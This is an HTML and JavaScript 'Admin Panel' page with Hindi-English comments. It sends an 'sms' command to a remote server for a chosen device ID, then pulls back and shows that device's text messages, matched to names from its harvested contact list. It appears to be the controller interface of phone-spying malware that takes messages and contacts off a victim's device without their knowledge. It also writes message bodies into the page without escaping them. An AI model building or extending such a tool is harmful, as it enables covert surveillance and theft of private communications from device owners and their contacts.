<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Messages - Admin Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --glass-bg: rgba(28, 28, 30, 0.9);
            --bubble-received: #262628;
            --bubble-sent: #0b84ff; /* iPhone Blue */
            --text-main: #ffffff;
            --text-muted: #8e8e93;
            --border-color: #38383a;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0; padding: 10px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 500px;
            background: #000;
            min-height: 100vh;
            padding-bottom: 20px;
        }

        /* --- Header & Search --- */
        .header {
            position: sticky; top: 0;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            z-index: 100;
            padding: 10px 0;
            border-bottom: 1px solid var(--border-color);
        }

        .top-row {
            display: flex; justify-content: space-between; align-items: center;
            padding: 0 10px 10px 10px;
        }

        .page-title { font-size: 1.8rem; font-weight: bold; }

        .back-btn {
            color: #0b84ff; font-size: 1.1rem; text-decoration: none;
            display: flex; align-items: center; gap: 5px;
        }

        .search-box {
            padding: 0 10px;
        }

        .search-input {
            width: 100%;
            background: #1c1c1e;
            border: none;
            padding: 10px 35px;
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            box-sizing: border-box;
        }

        .search-icon {
            position: absolute; left: 20px; top: 62px; color: var(--text-muted); font-size: 0.9rem;
        }

        /* --- SMS List --- */
        .sms-list {
            display: flex; flex-direction: column; gap: 15px;
            padding: 15px 10px;
        }

        .sms-card {
            background: var(--bubble-received);
            padding: 15px;
            border-radius: 18px;
            position: relative;
            animation: fadeIn 0.3s ease;
        }

        .sms-header {
            display: flex; justify-content: space-between; align-items: flex-start;
            margin-bottom: 8px;
        }

        .sender-info {
            display: flex; flex-direction: column;
        }

        .sender-name {
            font-size: 1rem; font-weight: 600; color: #fff;
        }

        .sender-number {
            font-size: 0.75rem; color: var(--text-muted); margin-top: 2px;
        }

        .time-badge {
            font-size: 0.75rem; color: var(--text-muted);
            white-space: nowrap;
        }

        .message-body {
            font-size: 0.95rem; color: #e0e0e0; line-height: 1.4;
            word-wrap: break-word;
        }

        /* --- Actions --- */
        .actions {
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid rgba(255,255,255,0.1);
            display: flex; justify-content: flex-end;
        }

        .action-btn {
            background: none; border: none; color: #0b84ff;
            cursor: pointer; font-size: 1.2rem;
            padding: 5px;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        #apiStatus {
            font-size: 12px; color: var(--text-muted); text-align: center; margin-top: 5px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="top-row">
                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
                <span class="page-title">Messages</span>
                <button onclick="handleRefresh()" style="background:none; border:none; color:#0b84ff; font-size:1.2rem;" id="refreshBtn">
                    <i class="fa-solid fa-rotate"></i>
                </button>
            </div>
            
            <div class="search-box">
                <i class="fa-solid fa-search search-icon"></i>
                <input type="text" id="searchInput" class="search-input" placeholder="Search" onkeyup="filterSMS()">
            </div>
            <div id="apiStatus">Updated just now</div>
        </div>

        <div id="sms-list" class="sms-list">
            <div style="text-align: center; color: #666; margin-top: 50px;">Waiting for data...</div>
        </div>
    </div>

<script>
    const SERVER_URL = "https://child-v9no.onrender.com";
    const urlParams = new URLSearchParams(window.location.search);
    const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
    
    const storageKeySMS = `sms_${DEVICE_ID}`;
    const storageKeyContacts = `contacts_${DEVICE_ID}`;

    let allSMSData = []; // Global variable for fast searching
    let contactMap = {}; // Fast Name Lookup

    document.addEventListener("DOMContentLoaded", function() {
        if (!DEVICE_ID) {
            alert("Device ID missing!");
            return;
        }
        
        // 1. Prepare Contact Map (Phone -> Name)
        prepareContactMap();

        // 2. Load Local Data Immediately
        loadFromStorage();

        // 3. Background Refresh
        handleRefresh();
    });

    // --- 1. CONTACT MAPPING (Speed Up) ---
    function prepareContactMap() {
        const savedContacts = localStorage.getItem(storageKeyContacts);
        if (savedContacts) {
            const contacts = JSON.parse(savedContacts);
            contacts.forEach(c => {
                // Number clean karo (last 10 digits match karne ke liye)
                let cleanNum = c.number.replace(/\D/g, '').slice(-10);
                if(cleanNum) contactMap[cleanNum] = c.name;
            });
        }
    }

    function getContactName(originalNum) {
        if (!originalNum) return "Unknown";
        let cleanNum = originalNum.replace(/\D/g, '').slice(-10);
        return contactMap[cleanNum] || originalNum; // Agar naam mila to naam, warna number
    }

    // --- 2. DATA LOADING ---
    function loadFromStorage() {
        const savedData = localStorage.getItem(storageKeySMS);
        if (savedData) {
            allSMSData = JSON.parse(savedData);
            renderSMS(allSMSData);
        }
    }

    function handleRefresh() {
        // Command bhejo
        fetch(`${SERVER_URL}/api/send-command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device_id: DEVICE_ID, command: 'sms' })
        });

        // 4 sec baad fetch karo
        const btn = document.getElementById("refreshBtn");
        btn.classList.add("fa-spin");
        setTimeout(fetchSMS, 4000);
    }

    function fetchSMS() {
        const btn = document.getElementById("refreshBtn");
        
        fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/sms?t=${Date.now()}`)
            .then(res => res.json())
            .then(data => {
                if (data && data.length > 0) {
                    allSMSData = data;
                    localStorage.setItem(storageKeySMS, JSON.stringify(data));
                    renderSMS(allSMSData);
                    document.getElementById("apiStatus").innerText = `Updated: ${new Date().toLocaleTimeString()}`;
                }
            })
            .catch(e => console.log(e))
            .finally(() => {
                btn.classList.remove("fa-spin");
            });
    }

    // --- 3. FILTERING (Search) ---
    function filterSMS() {
        const query = document.getElementById('searchInput').value.toLowerCase();
        
        const filtered = allSMSData.filter(sms => {
            const body = (sms.body || "").toLowerCase();
            const address = (sms.address || "").toLowerCase();
            const name = getContactName(sms.address).toLowerCase();
            
            return body.includes(query) || address.includes(query) || name.includes(query);
        });

        renderSMS(filtered);
    }

    // --- 4. RENDERING (The Speed Fix) ---
    function renderSMS(data) {
        const listContainer = document.getElementById("sms-list");
        
        if (!data || data.length === 0) {
            listContainer.innerHTML = '<div style="text-align: center; color: #666; margin-top: 50px;">No messages found.</div>';
            return;
        }

        // Limit to 100 messages for safety (Browser Crash na ho)
        const displayData = data.slice(0, 100);

        // ðŸ”¥ SUPER FAST TECHNIQUE: Map then Join
        // Loop ke andar innerHTML mat use karo
        const htmlString = displayData.map(sms => {
            const name = getContactName(sms.address);
            const isSaved = name !== sms.address; // Check agar contact saved hai
            
            let dateStr = "";
            if (!isNaN(sms.date)) {
                dateStr = new Date(parseInt(sms.date)).toLocaleDateString() + ", " + 
                          new Date(parseInt(sms.date)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
            }

            return `
                <div class="sms-card">
                    <div class="sms-header">
                        <div class="sender-info">
                            <span class="sender-name">${isSaved ? name : sms.address}</span>
                            ${isSaved ? `<span class="sender-number">${sms.address}</span>` : ''}
                        </div>
                        <span class="time-badge">${dateStr}</span>
                    </div>
                    <div class="message-body">
                        ${sms.body || 'No Content'}
                    </div>
                </div>
            `;
        }).join(''); // Saare HTML ko jod kar ek string bana lo

        listContainer.innerHTML = htmlString; // Sirf ek baar DOM update karo
    }
</script>
</body>
</html>
